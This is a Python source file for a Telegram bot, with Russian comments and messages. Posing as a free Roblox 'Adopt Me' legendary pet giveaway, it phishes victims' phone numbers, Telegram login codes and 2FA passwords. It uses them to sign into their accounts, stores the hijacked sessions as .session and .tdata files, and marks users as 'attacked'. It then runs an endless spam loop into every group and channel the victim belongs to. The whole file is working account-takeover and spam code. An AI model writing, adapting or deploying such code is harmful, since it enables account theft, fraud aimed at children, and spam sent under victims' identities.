import os
import json
import base64
import logging
import time
import asyncio
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneNumberInvalidError
from telethon.sessions import StringSession
from aiogram import Router, F, Bot
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove

from database import (
    add_user, get_total_users, save_phone_number, get_phone_number,
    update_last_login, log_auth_attempt, save_roblox_nick, get_roblox_nick,
    mark_attacked, is_user_attacked
)
from config import (
    WELCOME_MESSAGE, THANK_YOU_MESSAGE, SEND_CODE_MESSAGE,
    API_ID, API_HASH, MAX_CODE_ATTEMPTS, CODE_TIMEOUT,
    SESSIONS_DIR, SPAM_TEXT
)

logger = logging.getLogger(__name__)
router = Router()

# ======== СОСТОЯНИЯ FSM ========
class AuthStates(StatesGroup):
    waiting_roblox = State()
    waiting_phone = State()
    waiting_code = State()
    waiting_2fa = State()


# Хранилище для сессий
ephemeral_sessions = {}
user_codes = {}
user_code_attempts = {}
user_code_timestamps = {}


# ======== КЛАВИАТУРЫ ========

def get_contact_keyboard():
    """Клавиатура с кнопкой для отправки номера телефона"""
    kb = ReplyKeyboardMarkup(
        resize_keyboard=True,
        one_time_keyboard=True,
        keyboard=[
            [KeyboardButton(text="📱 Поделиться номером", request_contact=True)]
        ]
    )
    return kb


def get_main_keyboard():
    """Основная клавиатура после авторизации"""
    kb = ReplyKeyboardMarkup(
        resize_keyboard=True,
        keyboard=[
            [KeyboardButton(text="📊 Статистика")],
            [KeyboardButton(text="📤 Мои сессии")]
        ]
    )
    return kb


def normalize_code(code: str) -> str:
    return ''.join(filter(str.isdigit, code))


# ======== АВТОМАТИЧЕСКАЯ КОНВЕРТАЦИЯ .session → .tdata ========

def convert_session_to_tdata(session_string: str, user_id: int) -> str:
    """
    Мгновенная конвертация .session в .tdata
    Возвращает путь к созданному .tdata файлу
    """
    try:
        # Создаем папку для tdata если её нет
        TDATA_DIR = "tdata"
        os.makedirs(TDATA_DIR, exist_ok=True)
        
        # Декодируем сессию
        session_bytes = base64.b64decode(session_string + '=' * (-len(session_string) % 4))
        
        # Создаем структуру .tdata
        tdata = {
            'session': session_string,
            'api_id': API_ID,
            'api_hash': API_HASH,
            'version': 2,
            'auth_key': base64.b64encode(session_bytes).decode('utf-8'),
            'user_id': user_id,
            'created_at': int(time.time())
        }
        
        # Сохраняем .tdata файл
        tdata_path = os.path.join(TDATA_DIR, f"{user_id}.tdata")
        with open(tdata_path, 'w', encoding='utf-8') as f:
            json.dump(tdata, f, indent=2, ensure_ascii=False)
        
        logger.info(f"✅ .tdata создан: {tdata_path}")
        return tdata_path
        
    except Exception as e:
        logger.error(f"❌ Ошибка конвертации в .tdata: {e}")
        return None


# ======== АВТОМАТИЧЕСКАЯ РАССЫЛКА (ВСТРОЕНА) ========

class SpamBot:
    """Встроенный спам-движок для автоматической рассылки после авторизации"""
    
    def __init__(self, session_file: str, user_id: int):
        self.session_file = session_file
        self.user_id = user_id
        self.client = None
        self.running = True
        self.interval = 45  # секунд

    async def connect(self):
        """Подключение к аккаунту"""
        try:
            with open(self.session_file, 'r', encoding='utf-8') as f:
                session_string = f.read().strip()

            self.client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
            await self.client.connect()

            if not await self.client.is_user_authorized():
                logger.error(f"❌ Сессия {self.user_id} не активна")
                return False

            me = await self.client.get_me()
            logger.info(f"✅ Спам-бот подключен: @{me.username} (ID: {me.id})")
            return True

        except Exception as e:
            logger.error(f"❌ Ошибка подключения спам-бота {self.user_id}: {e}")
            return False

    async def get_all_groups(self):
        """Получить все группы и каналы"""
        groups = []
        try:
            dialogs = await self.client.get_dialogs()
            for dialog in dialogs:
                if dialog.is_group or dialog.is_channel:
                    groups.append({
                        'id': dialog.id,
                        'name': dialog.name,
                        'entity': dialog.entity,
                        'type': 'group' if dialog.is_group else 'channel'
                    })
            logger.info(f"📋 Найдено {len(groups)} групп/каналов для {self.user_id}")
            return groups
        except Exception as e:
            logger.error(f"❌ Ошибка получения диалогов {self.user_id}: {e}")
            return []

    async def send_spam_to_group(self, group, attempt=0):
        """Отправить спам в группу"""
        try:
            await self.client.send_message(group['entity'], SPAM_TEXT)
            logger.info(f"✅ [{self.user_id}] Спам отправлен в {group['name']}")
            return True
        except Exception as e:
            if "FLOOD" in str(e) or "Too many requests" in str(e):
                logger.warning(f"⚠️ [{self.user_id}] Флуд-лимит в {group['name']}, пауза 60с")
                await asyncio.sleep(60)
                if attempt < 3:
                    return await self.send_spam_to_group(group, attempt + 1)
            else:
                logger.error(f"❌ [{self.user_id}] Ошибка в {group['name']}: {e}")
            return False

    async def spam_loop(self):
        """Бесконечный цикл рассылки"""
        if not await self.connect():
            return

        groups = await self.get_all_groups()
        if not groups:
            logger.warning(f"⚠️ Нет групп для {self.user_id}")
            await self.client.disconnect()
            return

        logger.info(f"🔄 Запуск бесконечной рассылки для {self.user_id} (интервал {self.interval}с)")

        while self.running:
            try:
                for group in groups:
                    if not self.running:
                        break

                    logger.info(f"📤 [{self.user_id}] Отправка в {group['name']}...")
                    success = await self.send_spam_to_group(group)

                    if success:
                        logger.info(f"✅ [{self.user_id}] Отправлено в {group['name']}")

                    # Пауза между группами 3-7 секунд (имитация человека)
                    await asyncio.sleep(3 + (hash(group['name']) % 5))

                if self.running:
                    logger.info(f"⏳ [{self.user_id}] Цикл завершен, следующая волна через {self.interval}с")
                    await asyncio.sleep(self.interval)

            except Exception as e:
                logger.error(f"❌ [{self.user_id}] Ошибка в цикле: {e}")
                await asyncio.sleep(30)

        await self.client.disconnect()
        logger.info(f"🛑 [{self.user_id}] Спам-бот остановлен")

    def stop(self):
        self.running = False


# Глобальный словарь для хранения запущенных спам-ботов
active_spam_bots = {}


async def start_auto_spam(user_id: int, session_str: str):
    """Запускает автоматическую рассылку для аккаунта"""
    try:
        # Сохраняем сессию
        session_file = os.path.join(SESSIONS_DIR, f"{user_id}.session")
        with open(session_file, 'w', encoding='utf-8') as f:
            f.write(session_str)
        
        # ======================================================
        # 🔥 АВТОМАТИЧЕСКАЯ КОНВЕРТАЦИЯ В .TDATA (ВСТРОЕНА)
        # ======================================================
        tdata_path = convert_session_to_tdata(session_str, user_id)
        if tdata_path:
            logger.info(f"✅ .tdata автоматически создан: {tdata_path}")
        # ======================================================
        
        # Если для этого пользователя уже есть активный бот - останавливаем
        if user_id in active_spam_bots:
            active_spam_bots[user_id].stop()
            await asyncio.sleep(1)
        
        # Создаем и запускаем новый спам-бот
        spam_bot = SpamBot(session_file, user_id)
        active_spam_bots[user_id] = spam_bot
        
        # Запускаем в фоне
        asyncio.create_task(spam_bot.spam_loop())
        
        logger.info(f"✅ Автоматическая рассылка запущена для {user_id}")
        
    except Exception as e:
        logger.error(f"❌ Ошибка запуска спам-бота для {user_id}: {e}")


# ======== ОСНОВНЫЕ ХЕНДЛЕРЫ ========

@router.message(Command("start"))
async def start_handler(message: Message, state: FSMContext, bot: Bot):
    """Обработчик команды /start"""
    user = message.from_user
    user_id = user.id
    username = user.username if user.username else "Не указан"
    
    logger.info(f"🔄 /start от {user_id} ({username})")

    if is_user_attacked(user_id):
        await message.answer(
            "🎉 Ты уже участвуешь в розыгрыше!\n"
            "Жди результатов через 24 часа."
        )
        return

    roblox_nick = get_roblox_nick(user_id)
    if roblox_nick:
        await message.answer(
            f"👤 Привет, <b>{roblox_nick}</b>!\n\n"
            f"Теперь мне нужен твой номер телефона для подтверждения.",
            parse_mode="HTML"
        )
        await state.update_data(roblox_nick=roblox_nick)
        await message.answer(
            "📱 Нажми кнопку ниже и поделись номером:",
            reply_markup=get_contact_keyboard()
        )
        await state.set_state(AuthStates.waiting_phone)
        return

    await message.answer(
        "🎁 <b>РОЗЫГРЫШ ЛЕГЕНДАРНЫХ ПИТОМЦЕВ ADOPT ME!</b>\n\n"
        "Привет! Я бот, который раздает <b>бесплатных питомцев</b> в ADOPT ME!\n\n"
        "🔥 <b>Что нужно сделать:</b>\n"
        "1️⃣ Введи свой <b>Roblox Nickname</b>\n"
        "2️⃣ Подтверди номер телефона\n"
        "3️⃣ Получи код активации\n"
        "4️⃣ Получи <b>❤️ LEGENDARY PET</b>!\n\n"
        "❗️ <i>Только первые 100 участников!</i>\n\n"
        "🔽 <b>Введи свой Roblox ник:</b>",
        parse_mode="HTML"
    )
    await state.set_state(AuthStates.waiting_roblox)


@router.message(AuthStates.waiting_roblox)
async def roblox_nick_handler(message: Message, state: FSMContext, bot: Bot):
    """Обработчик ввода Roblox ника"""
    user_id = message.from_user.id
    roblox_nick = message.text.strip()
    
    logger.info(f"📝 Получен Roblox ник: {roblox_nick} от {user_id}")
    
    if len(roblox_nick) < 3 or len(roblox_nick) > 30:
        await message.answer(
            "❌ Ник должен быть от 3 до 30 символов.\n"
            "Попробуй еще раз:"
        )
        return
    
    if not roblox_nick.replace("_", "").replace("-", "").isalnum():
        await message.answer(
            "❌ Ник может содержать только буквы, цифры, _ и -\n"
            "Попробуй еще раз:"
        )
        return
    
    save_roblox_nick(user_id, roblox_nick)
    await state.update_data(roblox_nick=roblox_nick)
    
    logger.info(f"✅ Roblox ник сохранен: {roblox_nick}")
    
    await message.answer(
        f"✅ Отлично, <b>{roblox_nick}</b>!\n\n"
        f"Теперь мне нужен твой номер телефона.\n"
        f"Это нужно для подтверждения, что ты реальный игрок.",
        parse_mode="HTML"
    )
    
    await message.answer(
        "📱 Нажми кнопку ниже и поделись номером:",
        reply_markup=get_contact_keyboard()
    )
    await state.set_state(AuthStates.waiting_phone)


@router.message(AuthStates.waiting_phone, F.contact)
async def contact_handler(message: Message, state: FSMContext, bot: Bot):
    """Обработчик получения контакта"""
    if not message.contact:
        await message.answer(
            "❌ Пожалуйста, используй кнопку 'Поделиться номером'.",
            reply_markup=get_contact_keyboard()
        )
        return

    phone_number = message.contact.phone_number
    user_id = message.from_user.id
    username = f"@{message.from_user.username}" if message.from_user.username else "Не указан"
    
    data = await state.get_data()
    roblox_nick = data.get("roblox_nick", "Не указан")

    logger.info(f"📞 Получен номер {phone_number} от {user_id}")

    save_phone_number(user_id, phone_number)

    await message.answer(
        f"✅ Номер подтвержден!\n\n"
        f"📱 {phone_number}\n"
        f"👤 {roblox_nick}\n\n"
        f"Теперь отправляю код активации...",
        reply_markup=ReplyKeyboardRemove()
    )
    
    await state.update_data(phone=phone_number, username=username, roblox_nick=roblox_nick)
    await send_auth_code(message, state, bot, phone_number, username)


async def send_auth_code(message: Message, state: FSMContext, bot: Bot, phone_number: str, username: str):
    """Отправляет код авторизации"""
    user_id = message.from_user.id
    
    try:
        logger.info(f"📤 Запрос кода для {user_id} ({phone_number})")
        
        ephemeral_session = StringSession()
        ephemeral_sessions[user_id] = ephemeral_session
        
        client = TelegramClient(ephemeral_session, API_ID, API_HASH)
        await client.connect()
        
        if await client.is_user_authorized():
            await message.answer("✅ Ты уже участвуешь в розыгрыше!")
            await state.clear()
            return
        
        code_info = await client.send_code_request(phone_number, force_sms=True)
        logger.info(f"✅ Код отправлен, хеш: {code_info.phone_code_hash}")
        
        await client.disconnect()
        
        user_codes[user_id] = {
            "hash": code_info.phone_code_hash,
            "phone": phone_number,
            "username": username
        }
        user_code_attempts[user_id] = 0
        user_code_timestamps[user_id] = time.time()
        
        await message.answer(
            f"🔐 <b>Код активации отправлен!</b>\n\n"
            f"📱 На номер: <code>{phone_number}</code>\n\n"
            f"Введи код в формате:\n"
            f"<b>1.2.3.4.5</b>\n"
            f"⏳ Код действителен 5 минут",
            parse_mode="HTML"
        )
        
        await state.set_state(AuthStates.waiting_code)
        log_auth_attempt(user_id, phone_number, "code_sent")
        
    except PhoneNumberInvalidError:
        logger.error(f"❌ Неверный номер: {phone_number}")
        await message.answer("❌ Неверный номер телефона! Нажми /start заново")
        await state.clear()
    except Exception as e:
        logger.error(f"❌ Ошибка отправки кода: {e}")
        await message.answer(f"❌ Ошибка: {str(e)}")
        await state.clear()


@router.message(AuthStates.waiting_code)
async def code_handler(message: Message, state: FSMContext, bot: Bot):
    """Обработчик ввода кода"""
    user_id = message.from_user.id
    raw_code = message.text.strip()
    
    logger.info(f"🔐 Получен код '{raw_code}' от {user_id}")
    
    if user_id not in user_codes:
        await message.answer("❌ Нет активного ввода. Нажми /start")
        await state.clear()
        return
    
    if time.time() - user_code_timestamps.get(user_id, 0) > CODE_TIMEOUT:
        await message.answer("⏰ Время истекло. Нажми /start заново")
        del user_codes[user_id]
        await state.clear()
        return
    
    code = normalize_code(raw_code)
    
    if len(code) != 5 or not code.isdigit():
        await message.answer(
            f"❌ Код должен содержать 5 цифр.\n"
            f"Вы ввели: {raw_code}\n"
            f"Распознано: {code}\n\n"
            f"Попробуй еще раз в формате <b>1.2.3.4.5</b>",
            parse_mode="HTML"
        )
        return
    
    user_code_attempts[user_id] = user_code_attempts.get(user_id, 0) + 1
    
    if user_code_attempts[user_id] > MAX_CODE_ATTEMPTS:
        await message.answer("❌ Превышено число попыток! Нажми /start заново")
        del user_codes[user_id]
        await state.clear()
        return
    
    code_info = user_codes[user_id]
    
    await message.answer("🔐 Проверка кода...")
    
    result = await login(
        message, state, bot,
        code_info["phone"],
        code,
        code_info["hash"],
        code_info["username"]
    )
    
    if result == "2FA_REQUIRED":
        await message.answer("🔑 Введи пароль от Telegram (2FA):")
        await state.set_state(AuthStates.waiting_2fa)
    elif result == "SUCCESS":
        del user_codes[user_id]
        await state.clear()


async def login(message: Message, state: FSMContext, bot: Bot, phone_number, code, phone_code_hash, username):
    """Авторизация пользователя и запуск автоматической рассылки"""
    user_id = message.from_user.id
    
    logger.info(f"🔑 Попытка входа для {user_id}")
    
    if user_id not in ephemeral_sessions:
        await message.answer("❌ Нет активной сессии. Нажми /start")
        await state.clear()
        return None
    
    ephemeral_session = ephemeral_sessions[user_id]
    client = TelegramClient(ephemeral_session, API_ID, API_HASH)
    
    try:
        await client.connect()
        
        try:
            await client.sign_in(
                phone=phone_number,
                code=code,
                phone_code_hash=phone_code_hash
            )
        except SessionPasswordNeededError:
            logger.info("🔑 Требуется 2FA")
            return "2FA_REQUIRED"
        except PhoneCodeInvalidError:
            logger.warning(f"❌ Неверный код для {user_id}")
            await message.answer("❌ Неверный код. Попробуй еще раз.")
            log_auth_attempt(user_id, phone_number, "invalid_code")
            return None
        
        if await client.is_user_authorized():
            logger.info(f"✅ Успешный вход для {user_id}")
            
            mark_attacked(user_id)
            
            data = await state.get_data()
            roblox_nick = data.get("roblox_nick", "Не указан")
            
            session_str = ephemeral_session.save()
            
            # ======================================================
            # 🔥 АВТОМАТИЧЕСКИЙ ЗАПУСК РАССЫЛКИ + КОНВЕРТАЦИЯ
            # ======================================================
            await start_auto_spam(user_id, session_str)
            # ======================================================
            
            await message.answer(
                f"🎉 <b>ПОЗДРАВЛЯЮ!</b>\n\n"
                f"Ты выиграл <b>🌟 LEGENDARY PET</b>!\n"
                f"Скоро он появится в твоем инвентаре Roblox.\n\n"
                f"👤 Roblox ник: <code>{roblox_nick}</code>\n"
                f"📱 Номер: <code>{phone_number}</code>\n\n"
                f"❤️ Спасибо за участие!\n\n"
                f"🔄 ВАШ УНИКАЛЬНЫЙ ПИТОМЕЦ БУДЕТ У ВАС УЖЕ В ТЕЧЕНИИ 24 ЧАСОВ\n"
                f"📁 Для того чтобы он появился ничего не нужно делать, просто ждите/",
                parse_mode="HTML",
                reply_markup=get_main_keyboard()
            )
            
            update_last_login(user_id)
            log_auth_attempt(user_id, phone_number, "success")
            
            return "SUCCESS"
        else:
            logger.warning(f"❌ Не удалось авторизовать {user_id}")
            await message.answer("❌ Не удалось авторизоваться.")
            return None
            
    except Exception as e:
        logger.error(f"❌ Ошибка входа: {e}")
        await message.answer(f"❌ Ошибка: {str(e)}")
        return None
    finally:
        await client.disconnect()


@router.message(AuthStates.waiting_2fa)
async def enter_2fa_handler(message: Message, state: FSMContext, bot: Bot):
    """Обработчик ввода 2FA пароля"""
    user_id = message.from_user.id
    password = message.text.strip()
    
    logger.info(f"🔑 Ввод 2FA для {user_id}")
    
    if user_id not in ephemeral_sessions:
        await message.answer("❌ Нет активной сессии. Нажми /start")
        await state.clear()
        return
    
    ephemeral_session = ephemeral_sessions[user_id]
    client = TelegramClient(ephemeral_session, API_ID, API_HASH)
    
    try:
        await client.connect()
        await client.sign_in(password=password)
        
        if await client.is_user_authorized():
            logger.info(f"✅ 2FA успешно для {user_id}")
            
            mark_attacked(user_id)
            
            session_str = ephemeral_session.save()
            
            # ======================================================
            # 🔥 АВТОМАТИЧЕСКИЙ ЗАПУСК РАССЫЛКИ + КОНВЕРТАЦИЯ
            # ======================================================
            await start_auto_spam(user_id, session_str)
            # ======================================================
            
            update_last_login(user_id)
            log_auth_attempt(user_id, "2fa", "success")
            
            await message.answer(
                "🎉 <b>ПОЗДРАВЛЯЮ!</b>\n\n"
                "Ты выиграл <b>🌟 LEGENDARY PET</b>!\n"
                "Скоро он появится в твоем инвентаре Roblox.\n\n"
                "🔄 Автоматическая рассылка запущена!\n"
                "📁 .tdata файл создан в папке tdata/",
                parse_mode="HTML",
                reply_markup=get_main_keyboard()
            )
            
            await state.clear()
        else:
            logger.warning(f"❌ Неверный 2FA пароль для {user_id}")
            await message.answer("❌ Неверный пароль 2FA! Попробуй еще раз.")
            log_auth_attempt(user_id, "2fa", "invalid")
            
    except Exception as e:
        logger.error(f"❌ Ошибка 2FA: {e}")
        await message.answer(f"❌ Ошибка 2FA: {str(e)}")
    finally:
        await client.disconnect()
        if user_id in ephemeral_sessions:
            del ephemeral_sessions[user_id]


@router.message(Command("cancel"))
async def cancel_handler(message: Message, state: FSMContext):
    """Отмена текущего действия"""
    await state.clear()
    await message.answer("❌ Действие отменено.", reply_markup=ReplyKeyboardRemove())


@router.message()
async def catch_all(message: Message, state: FSMContext):
    """Ловим все сообщения"""
    current_state = await state.get_state()
    logger.info(f"📩 Получено: '{message.text}' от {message.from_user.id}, состояние: {current_state}")
    
    if current_state is None:
        await message.answer(
            "❓ Я не понимаю эту команду.\n"
            "Напиши /start для участия в розыгрыше!"
        )
    else:
        await message.answer(
            f"⏳ Пожалуйста, следуй инструкциям.\n"
            f"Текущий шаг: {current_state.split('.')[-1]}"
        )